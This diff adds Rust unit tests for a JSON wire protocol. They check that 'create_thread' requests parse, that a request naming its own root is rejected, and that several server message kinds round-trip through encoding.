+// ---- create_thread and the new server kinds ---------------------------------------------------
+
+#[test]
+fn create_thread_is_an_empty_request() {
+    let msg = parse(&json!({ "v": 2, "kind": "create_thread", "id": "c1" }))
+        .expect("create_thread parses");
+    assert_eq!(msg.kind(), "create_thread");
+    assert_eq!(msg.request_id(), Some("c1"));
+    assert_eq!(
+        verdict(&json!({ "v": 2, "kind": "create_thread", "id": "c1", "root": "/elsewhere" })),
+        "bad_request",
+        "a panel never names the root it creates in"
+    );
+}
+
+#[test]
+fn created_project_open_and_project_closed_round_trip() {
+    let thread = json!({
+        "thread_id": "5f0c2a9e-7b1d-4c3a-9e4f-2d8b6a1c0e7f",
+        "title": "New thread",
+        "project": "app",
+        "agent": "Claude Agent",
+        "status": "idle",
+        "followed": false
+    });
+    for wire in [
+        json!({ "v": 2, "kind": "created", "id": "c1", "thread": thread }),
+        json!({ "v": 2, "kind": "project_open" }),
+        json!({ "v": 2, "kind": "project_closed" }),
+    ] {
+        let msg: ServerMsg = serde_json::from_value(wire.clone())
+            .unwrap_or_else(|e| panic!("{wire} deserializes: {e}"));
+        let line = encode_server(&msg).expect("encodes");
+        let back: Value = serde_json::from_str(line.trim_end()).expect("json line");
+        assert_eq!(back, wire);
+    }
+}
